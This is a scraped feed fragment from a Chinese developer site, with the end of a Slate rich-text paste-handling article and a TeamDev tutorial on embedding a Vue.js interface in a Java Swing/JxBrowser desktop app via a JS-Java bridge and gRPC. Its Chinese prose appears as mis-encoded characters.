<pre><code class="hljs language-typescript" lang="typescript">  newEditor.<span class="hljs-property">insertData</span> = <span class="hljs-function">(<span class="hljs-params">data</span>) =&gt;</span> {
    <span class="hljs-keyword">const</span> richTextEntry = <span class="hljs-title class_">SlateEditor</span>.<span class="hljs-property">above</span>&lt;<span class="hljs-title class_">RichTextElement</span>&gt;(newEditor, {
      <span class="hljs-attr">match</span>: <span class="hljs-function"><span class="hljs-params">n</span> =&gt;</span> <span class="hljs-title class_">DomEditor</span>.<span class="hljs-title function_">checkNodeType</span>(n, richTextModuleType),
      <span class="hljs-attr">mode</span>: <span class="hljs-string">'highest'</span>,
    })

    <span class="hljs-keyword">if</span> (!richTextEntry) {
      <span class="hljs-title function_">insertData</span>(data)
      <span class="hljs-keyword">return</span>
    }

    <span class="hljs-keyword">const</span> html = data.<span class="hljs-title function_">getData</span>(<span class="hljs-string">'text/html'</span>)

    <span class="hljs-keyword">if</span> (html) {
      <span class="hljs-keyword">const</span> fragment = <span class="hljs-title function_">htmlToContent</span>(editor, html)
      <span class="hljs-title class_">SlateTransforms</span>.<span class="hljs-title function_">insertNodes</span>(newEditor, fragment)
      <span class="hljs-keyword">return</span>
    }

    <span class="hljs-title function_">insertData</span>(data)
  }
</code></pre>
<p>æ•ˆæœå¦‚ä¸‹ï¼Œæ ‡é¢˜çš„æ ·å¼ä¹Ÿå¾—åˆ°äº†ä¿ç•™ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/36eebc1ad2ea4f9a8b25541b75c3a538~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSGFiYXJhQWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767619420&amp;x-signature=Nv5lZc0mI3%2BaJJLovtI7ZZD6Oag%3D" alt="image.png" loading="lazy"/></p>
<p>è¡¨å•æ¨¡å—ä¹Ÿæ‹¿åˆ°äº†å¯Œæ–‡æœ¬çš„å†…å®¹ï¼Œä¸šåŠ¡ç³»ç»Ÿå°±å¯ä»¥æ ¹æ®ç¼–è¾‘å™¨å®ä¾‹è·å–åˆ°æ¨¡ç‰ˆçš„ç»“æ„åŒ–å€¼äº†ï¼š
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7e11c65a6931479e876fc8ecd6225a13~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSGFiYXJhQWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767619420&amp;x-signature=O39Kfm%2F4vPCMalgx9JshS7Ds7Mw%3D" alt="image.png" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä½¿ç”¨ Vue.js æ„å»º Java æ¡Œé¢åº”ç”¨]]></title>    <link>https://juejin.cn/post/7589126217250455593</link>    <guid>https://juejin.cn/post/7589126217250455593</guid>    <pubDate>2025-12-29T11:31:02.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589126217250455593" data-draft-id="7589082912588693547" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä½¿ç”¨ Vue.js æ„å»º Java æ¡Œé¢åº”ç”¨"/> <meta itemprop="keywords" content="Vue.js,Java,å‰ç«¯"/> <meta itemprop="datePublished" content="2025-12-29T11:31:02.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="TeamDev"/> <meta itemprop="url" content="https://juejin.cn/user/4158825167847872"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä½¿ç”¨ Vue.js æ„å»º Java æ¡Œé¢åº”ç”¨
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4158825167847872/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    TeamDev
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T11:31:02.000Z" title="Mon Dec 29 2025 11:31:02 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6e2563112fd5454b96d6f081bda447f9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVGVhbURldg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767612662&amp;x-signature=8nglmSr9qmh0paZQSBLa9Lictvw%3D" alt="" loading="lazy"/></p>
<p>å¦‚ä»Šï¼Œè¶Šæ¥è¶Šå¤šçš„æ¡Œé¢åº”ç”¨å¼€å§‹é‡‡ç”¨ Web åŒ–ç•Œé¢è®¾è®¡ã€‚è¿™ç§æ–¹æ³•å®Œç¾ç»“åˆäº† Web æŠ€æœ¯çš„çµæ´»æ€§ä¸åŸç”Ÿåº”ç”¨çš„æ€§èƒ½ä¼˜åŠ¿åŠç³»ç»Ÿé›†æˆèƒ½åŠ›ï¼Œæˆä¸ºæ¡Œé¢å¼€å‘çš„ä¸»æµè¶‹åŠ¿ã€‚</p>
<p>æœ¬æ–‡ä»‹ç»çš„ Java æ¡Œé¢åº”ç”¨æ­£æ˜¯åŸºäºè¿™ä¸€ç°ä»£æ¶æ„ï¼šé€šè¿‡ Vue.js ä¸ Tailwind CSS æ„å»º Web ç•Œé¢ï¼Œå®ç°äº†è·¨å¹³å°ä¸€è‡´ã€æµç•…å“åº”ä¸”è®¾è®¡ç²¾ç¾çš„ç”¨æˆ·ä½“éªŒã€‚</p>
<h2 data-id="heading-0">Web UI å¯¹æ¯”åŸç”Ÿ UI</h2>
<p>ä¼ ç»Ÿæ¡Œé¢åº”ç”¨çš„åŸç”Ÿ UI å·¥å…·åŒ…é•¿æœŸéš¾ä»¥æ»¡è¶³ç°ä»£ UI éœ€æ±‚ â€”â€” è¦å®ç°ç²¾è‡´çš„è§†è§‰æ•ˆæœã€æµç•…çš„åŠ¨ç”»è¿‡æ¸¡ã€é«˜ DPI å±å¹•é€‚é…ï¼Œæˆ–æ˜¯åƒ Web åº”ç”¨é‚£æ ·çµæ´»åˆ‡æ¢ä¸»é¢˜ï¼ˆäº®è‰² / æš—è‰²æ¨¡å¼ã€è‡ªå®šä¹‰é…è‰²ç­‰ï¼‰ï¼Œå¾€å¾€éœ€è¦å¤§é‡å®šåˆ¶å¼€å‘å·¥ä½œã€‚</p>
<p>å¦ä¸€æ–¹é¢ï¼ŒåŸºäº Web çš„ç”¨æˆ·ç•Œé¢å—ç›Šäºåºå¤§çš„ç”Ÿæ€ç³»ç»Ÿï¼Œå…¶ä¸­åŒ…å«ç°æˆçš„åº“ã€ç»„ä»¶æ¡†æ¶ã€å“åº”å¼è®¾è®¡ï¼Œä»¥åŠè·¨æ“ä½œç³»ç»Ÿå’Œè®¾å¤‡å½¢æ€çš„ä¸€è‡´æ€§ã€‚</p>
<p>é€šè¿‡åœ¨æ¡Œé¢å¤–å£³ä¸­åµŒå…¥ Web UIï¼Œæˆ‘ä»¬æ—¢èƒ½ä½¿ç”¨ç°ä»£ Web é£æ ¼çš„ç•Œé¢ï¼Œåˆèƒ½åˆ©ç”¨åŸç”Ÿåº”ç”¨çš„èƒ½åŠ›ã€‚çº¯ Web åº”ç”¨ç”±äºç¼ºä¹å®Œå…¨çš„æ–‡ä»¶ç³»ç»Ÿè®¿é—®ã€OS API å’Œç¦»çº¿èƒ½åŠ›ï¼Œå¾ˆéš¾å®Œå…¨æ›¿ä»£æ¡Œé¢åº”ç”¨ï¼›è€Œåœ¨åŸç”ŸåŒ…è£…ä¸­è¿è¡Œ Web UI åˆ™å¼¥è¡¥äº†è¿™äº›ä¸è¶³ï¼Œå®ç°ä¸¤è€…çš„æœ€ä½³ç»„åˆã€‚</p>
<h2 data-id="heading-1">åº”ç”¨æ¦‚è§ˆ</h2>
<p>è¯¥åº”ç”¨æ˜¯ä¸€æ¬¾è·¨å¹³å° Java æ¡Œé¢åº”ç”¨ç¨‹åºï¼Œæ ¸å¿ƒæ¶æ„æ˜¯åœ¨åŸç”Ÿ Java çª—å£ä¸­é›†æˆç°ä»£åŒ– Vue.js Web ç•Œé¢ï¼Œé€šè¿‡ Shadcn ç»„ä»¶åº“æ„å»ºç®€æ´ç›´è§‚çš„æ“ä½œç•Œé¢ã€‚</p>
<p>è¿™ç§æ¶æ„ç¡®ä¿äº†ä»¥ä¸‹ç‰¹æ€§ï¼š</p>
<ul>
<li>åœ¨ Windowsã€macOSã€Linux ä¸Šç»Ÿä¸€çš„ç•Œé¢å‘ˆç°ã€‚</li>
<li>ä¸æ»‘çš„äº¤äº’ä½“éªŒï¼Œæ¥è¿‘ Web åº”ç”¨çš„æµç•…åº¦ã€‚</li>
<li>é€šè¿‡æ‰“åŒ…æ‰€æœ‰èµ„æºå®ç°ç¦»çº¿è¿è¡Œï¼Œå¯åŠ¨å³å¯ä½¿ç”¨ï¼Œæ— éœ€ç½‘ç»œè¿æ¥ã€‚</li>
</ul>
<p>åº”ç”¨å¯åŠ¨åä¼šæ˜¾ç¤ºä¸»æ§åˆ¶é¢æ¿ä»¥åŠåå¥½è®¾ç½®çª—å£ï¼Œç”¨æˆ·å¯ä»¥è°ƒæ•´ç•Œé¢ä¸»é¢˜ã€å­—ä½“å¤§å°ã€å¸ƒå±€ç­‰é€‰é¡¹ã€‚æ‰€æœ‰è®¾ç½®éƒ½ä¿å­˜åœ¨æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿï¼Œå¹¶åœ¨ä¸‹æ¬¡å¯åŠ¨æ—¶è‡ªåŠ¨æ¢å¤ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/744074cb0abd477ab27fd83c56fe4602~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVGVhbURldg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767612662&amp;x-signature=CwRfsEGvZs%2FyNOFV7g1SN7bCzHg%3D" alt="åŸºäº Vue.js æ„å»º UI çš„æ¡Œé¢åº”ç”¨" loading="lazy"/></p>
<p align="center"><span>åŸºäº Vue.js æ„å»º UI çš„æ¡Œé¢åº”ç”¨</span></p>
<p>å®Œæ•´æºä»£ç å¯åœ¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FTeamDev-IP%2FJxBrowser-Gallery%2Ftree%2Fmaster%2Fdesktop-web-app%3Futm_source%3Djuejin%26utm_medium%3Darticle%26utm_campaign%3Ddesktop-app-with-vue-js" target="_blank" title="https://github.com/TeamDev-IP/JxBrowser-Gallery/tree/master/desktop-web-app?utm_source=juejin&amp;utm_medium=article&amp;utm_campaign=desktop-app-with-vue-js" ref="nofollow noopener noreferrer">GitHub</a> è·å–ã€‚</p>
<h2 data-id="heading-2">åº”ç”¨çª—å£ä¸ Web è§†å›¾</h2>
<p>åº”ç”¨ä¸»çª—å£åŸºäº Java Swing çš„ <code>JFrame</code>å®ç°ï¼Œä½œä¸º Java å†…ç½®ç»„ä»¶ï¼Œå®ƒå…·å¤‡è½»é‡æ˜“ç”¨çš„ç‰¹ç‚¹ã€‚çª—å£å†…éƒ¨åµŒå…¥äº† JxBrowser æä¾›çš„ Chromium å†…æ ¸ Web è§†å›¾ç»„ä»¶ï¼Œèƒ½å¤Ÿç›´æ¥åœ¨æ¡Œé¢çª—å£ä¸­æ¸²æŸ“ Vue.js ç•Œé¢ï¼Œå¹¶æ”¯æŒæ‰€æœ‰ç°ä»£æµè§ˆå™¨ç‰¹æ€§ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">var</span> <span class="hljs-variable">engine</span> <span class="hljs-operator">=</span> Engine.newInstance(HARDWARE_ACCELERATED);
<span class="hljs-type">var</span> <span class="hljs-variable">browser</span> <span class="hljs-operator">=</span> engine.newBrowser();

SwingUtilities.invokeLater(() -&gt; {
    <span class="hljs-type">var</span> <span class="hljs-variable">view</span> <span class="hljs-operator">=</span> BrowserView.newInstance(browser);
    <span class="hljs-type">var</span> <span class="hljs-variable">frame</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JFrame</span>(<span class="hljs-string">"Application"</span>);
    frame.addWindowListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">WindowAdapter</span>() {
        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">windowClosing</span><span class="hljs-params">(WindowEvent e)</span> {
            engine.close();
        }
    });
    frame.setDefaultCloseOperation(WindowConstants.DISPOSE_ON_CLOSE);
    frame.add(view, BorderLayout.CENTER);
    frame.setSize(<span class="hljs-number">1280</span>, <span class="hljs-number">900</span>);
    frame.setLocationRelativeTo(<span class="hljs-literal">null</span>);
    frame.setVisible(<span class="hljs-literal">true</span>);
});
</code></pre>
<p>è¿™å¥—æ¶æ„åˆ†å·¥æ˜ç¡®ï¼šJava åç«¯è´Ÿè´£æ ¸å¿ƒä¸šåŠ¡é€»è¾‘ï¼ˆæ•°æ®è¯»å†™ã€æ–‡ä»¶æ“ä½œç­‰ï¼‰ï¼ŒVue.js å‰ç«¯ä¸“æ³¨äºç•Œé¢å¸ƒå±€ä¸ç”¨æˆ·äº¤äº’ï¼Œå„å¸å…¶èŒä¸”é«˜æ•ˆååŒã€‚</p>
<h2 data-id="heading-3">æ¡Œé¢åº”ç”¨ä¸­åŠ è½½ Web UI</h2>
<p>Vue.js éƒ¨åˆ†æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªæ ‡å‡† Web é¡¹ç›®ï¼Œæ ¹æ®ç¯å¢ƒçš„ä¸åŒï¼Œåº”ç”¨ä¼šä»æœ¬åœ°å¼€å‘æœåŠ¡å™¨æˆ–åµŒå…¥å¼é™æ€æ–‡ä»¶åŠ è½½å®ƒã€‚</p>
<h3 data-id="heading-4">å¼€å‘ç¯å¢ƒ</h3>
<p>å¼€å‘ç¯å¢ƒçš„ Web åº”ç”¨åŠ è½½æµç¨‹æä¸ºç®€æ´ï¼šå¯åŠ¨æœ¬åœ°å¼€å‘æœåŠ¡å™¨åï¼Œç›´æ¥è®¿é—® localhost åœ°å€å³å¯ï¼š</p>
<pre><code class="hljs language-shell" lang="shell">./gradlew desktop-web-app:startDevServer -Pfrontend=vue
</code></pre>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">if</span> (!AppDetails.isProduction()) {  
   browser.navigation().loadUrl(<span class="hljs-string">"http://localhost"</span>);
} <span class="hljs-keyword">else</span> {
   ...
}
</code></pre>
<p>åº”ç”¨å¯åŠ¨åï¼ŒåµŒå…¥å¼ Web è§†å›¾ä¼šå¯¼èˆªè‡³æœ¬åœ°å¼€å‘æœåŠ¡å™¨åœ°å€ã€‚æ­¤æ—¶ä¿®æ”¹ Vue ç»„ä»¶æˆ–æ ·å¼ï¼Œæ— éœ€é‡æ–°æ„å»º Java éƒ¨åˆ†å³å¯å®æ—¶ç”Ÿæ•ˆã€‚</p>
<h3 data-id="heading-5">ç”Ÿäº§ç¯å¢ƒ</h3>
<p>åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œæ¡Œé¢åº”ç”¨éœ€è¦å®Œå…¨ç¦»çº¿è¿è¡Œã€‚ä¾èµ–æœ¬åœ° Web æœåŠ¡å™¨ä¸ä»…å¢åŠ å¤æ‚åº¦ï¼Œä¹Ÿå¸¦æ¥æ½œåœ¨å®‰å…¨é£é™©ã€‚</p>
<p>ä»æœ¬åœ°æˆ–è¿œç¨‹æœåŠ¡å™¨æä¾›ç”¨æˆ·ç•Œé¢ä¼šå¢åŠ é¢å¤–çš„å®‰å…¨é£é™©ï¼›ç”¨æˆ·å¯èƒ½ä¼šåœ¨æµè§ˆå™¨ä¸­åŠ è½½ Web åº”ç”¨ç¨‹åº URL å¹¶æ£€æŸ¥åº”ç”¨ç¨‹åºçš„æºä»£ç ï¼Œä»è€Œæš´éœ²æ•æ„Ÿé€»è¾‘ã€‚æˆ‘ä»¬å½“ç„¶ä¸å¸Œæœ›è¿™ç§æƒ…å†µå‘ç”Ÿï¼Œæˆ‘ä»¬å¸Œæœ›ç”¨æˆ·ç•Œé¢åªèƒ½åœ¨æ¡Œé¢åº”ç”¨ç¨‹åºå†…éƒ¨è®¿é—®ï¼Œå¹¶ä¸”å…¶æºä»£ç éšè—åœ¨åº”ç”¨ç¨‹åºå†…éƒ¨ã€‚</p>
<p>ä¸ºå®ç°è¿™ä¸€ç›®æ ‡ï¼Œæˆ‘ä»¬å°† Web åº”ç”¨æ–‡ä»¶æ‰“åŒ…è‡³ Java èµ„æºç›®å½•ï¼Œé€šè¿‡ JxBrowser çš„è‡ªå®šä¹‰åè®®æ‹¦æˆª API ä»ç±»è·¯å¾„ä¸­ç›´æ¥åŠ è½½èµ„æºã€‚</p>
<p>é¦–å…ˆé…ç½®è‡ªå®šä¹‰åè®®ä¸è¯·æ±‚æ‹¦æˆªå™¨ï¼Œç”¨äºå¤„ç† Web èµ„æºè¯·æ±‚ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">var</span> <span class="hljs-variable">options</span> <span class="hljs-operator">=</span> EngineOptions.newBuilder(HARDWARE_ACCELERATED)
        .addScheme(Scheme.of(<span class="hljs-string">"jxb"</span>), <span class="hljs-keyword">new</span> <span class="hljs-title class_">UrlRequestInterceptor</span>());
<span class="hljs-type">var</span> <span class="hljs-variable">engine</span> <span class="hljs-operator">=</span> Engine.newInstance(options.build());
</code></pre>
<p>Vue.js åº”ç”¨è¢«ç›´æ¥æ‰“åŒ…åˆ° Java èµ„æºä¸­ï¼Œé€šè¿‡ JxBrowser åŠ è½½ï¼Œä½¿ UI éƒ¨åˆ†å®Œå…¨ç‹¬ç«‹å°è£…ï¼š</p>
<ul>
<li>æ‰€æœ‰ HTMLã€CSSã€JavaScript æ–‡ä»¶å‡ä»åº”ç”¨ JAR åŒ…ä¸­è¯»å–</li>
<li>æ— éœ€ä¾èµ–ä»»ä½•å¤–éƒ¨æœåŠ¡å™¨</li>
<li>æºä»£ç ä¸ä¼šè¢«æµè§ˆå™¨å¼€å‘è€…å·¥å…·å®¡æŸ¥</li>
</ul>
<p>è¿™ç§æ–¹æ¡ˆç¡®ä¿äº†åº”ç”¨çš„é«˜æ€§èƒ½ã€å®‰å…¨æ€§ä¸å¯ç§»æ¤æ€§ï¼Œåœ¨ Windowsã€macOS å’Œ Linux ä¸‰å¤§æ“ä½œç³»ç»Ÿä¸Šå‡èƒ½ç¨³å®šè¿è¡Œã€‚</p>
<h2 data-id="heading-6">Vue.js ä¸ Java ä¹‹é—´çš„é€šä¿¡</h2>
<p>ä¸ºäº†å®ç°åº”ç”¨ç¨‹åºé€»è¾‘ï¼ŒVue.js å‰ç«¯éœ€è¦ä¸ Java åç«¯é€šä¿¡â€”â€”ä¾‹å¦‚ï¼Œè¯»å–æˆ–æ›´æ–°å­˜å‚¨åœ¨ç£ç›˜ä¸Šçš„åå¥½è®¾ç½®ã€‚</p>
<h3 data-id="heading-7">JxBrowser JavaScript - Java æ¡¥æ¥å™¨</h3>
<p>JxBrowser å†…ç½®äº† JavaScript ä¸ Java çš„ç›´æ¥é€šä¿¡æ¡¥ï¼Œå…è®¸ Web UI ç›´æ¥è°ƒç”¨ Java æ–¹æ³•ã€‚Vue.js å‰ç«¯å¯é€šè¿‡è¯¥æ¡¥è°ƒç”¨åç«¯æ¥å£ï¼ˆå¦‚ "ä¿å­˜ä¸»é¢˜è®¾ç½®"ï¼‰ï¼ŒJava åç«¯ä¹Ÿèƒ½ä¸»åŠ¨å‘å‰ç«¯å‘é€äº‹ä»¶æˆ–æ•°æ®æ›´æ–°ã€‚</p>
<p>ä»¥ä¸‹æ˜¯å¦‚ä½•åœ¨ JxBrowser ä¸­å£°æ˜ JavaScript å’Œ Java ä¹‹é—´é€šä¿¡çš„ç±»å‹ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@JsAccessible</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">PrefsService</span> {
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFontSize</span><span class="hljs-params">(<span class="hljs-type">int</span> size)</span> {
    
    }
}
</code></pre>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">declare</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PrefsService</span> { 
    <span class="hljs-title function_">setFontSize</span>(<span class="hljs-attr">size</span>: <span class="hljs-built_in">number</span>): <span class="hljs-built_in">void</span>; 
}

<span class="hljs-keyword">declare</span> <span class="hljs-keyword">const</span> <span class="hljs-attr">prefService</span>: <span class="hljs-title class_">PrefsService</span>;
...
prefsService.<span class="hljs-title function_">setFontSize</span>(<span class="hljs-number">12</span>);
</code></pre>
<h3 data-id="heading-8">Protobuf + gRPC</h3>
<p>å¯¹äºç®€å•äº¤äº’ï¼Œåº”ç”¨ä»å¯ä½¿ç”¨ç°æœ‰ REST æ¥å£ï¼›è€Œé’ˆå¯¹æ›´å¤æ‚ã€éœ€è¦å¯æ‰©å±•æ€§çš„åŠŸèƒ½ï¼Œæˆ‘ä»¬å¼•å…¥äº† Protocol Buffersï¼ˆProtobufï¼‰ä¸ gRPCï¼Œæ„å»ºäº†æ›´å¿«é€Ÿã€ç±»å‹å®‰å…¨çš„é€šä¿¡å±‚ã€‚</p>
<p>é€šè¿‡ Protobuf ç»Ÿä¸€å®šä¹‰æ•°æ®ç»“æ„ä¸æœåŠ¡ APIï¼Œå¯è‡ªåŠ¨ä¸ºå‰åç«¯ç”Ÿæˆå¼ºç±»å‹å®¢æˆ·ç«¯ / æœåŠ¡å™¨ä»£ç ã€‚åªéœ€åœ¨ <code>.proto</code> æ–‡ä»¶ä¸­å®šä¹‰æ¶ˆæ¯æ ¼å¼ä¸æœåŠ¡æ¥å£ï¼ŒProtobuf ä¾¿ä¼šè‡ªåŠ¨ç”Ÿæˆ Java ä¸ TypeScript ä»£ç ã€‚</p>
<pre><code class="hljs language-proto" lang="proto">service PrefsService {
  rpc SetFontSize(FontSize) returns (google.protobuf.Empty);
}

enum FontSize {
  SMALL = 0;
  DEFAULT = 1;
  LARGE = 2;
}
</code></pre>
<p>gRPC ä½œä¸ºä¼ è¾“å±‚ï¼šJava åç«¯è¿è¡Œè½»é‡çº§ gRPC æœåŠ¡å™¨ï¼ŒVue.js åº”ç”¨ä»¥å®¢æˆ·ç«¯èº«ä»½ä¸ä¹‹é€šä¿¡ï¼Œå®ç°ç»“æ„åŒ–æ•°æ®çš„å®‰å…¨é«˜æ•ˆä¼ è¾“ã€‚</p>
<p>è¯¥æ–¹æ¡ˆå¸¦æ¥äº†ä¸‰å¤§ä¼˜åŠ¿ï¼š</p>
<ul>
<li>åœ¨åº”ç”¨å‰åç«¯ä¹‹é—´å®ç°ç±»å‹å®‰å…¨ã€‚</li>
<li>åœ¨æ„å»ºé˜¶æ®µè·å¾—è‡ªåŠ¨è¡¥å…¨ä¸é”™è¯¯æ£€æŸ¥èƒ½åŠ›ã€‚</li>
<li>å½“åŠŸèƒ½æˆ– API å¢åŠ æ—¶ï¼Œç³»ç»Ÿèƒ½å¤Ÿæ›´å®¹æ˜“æ‰©å±•ã€‚</li>
</ul>
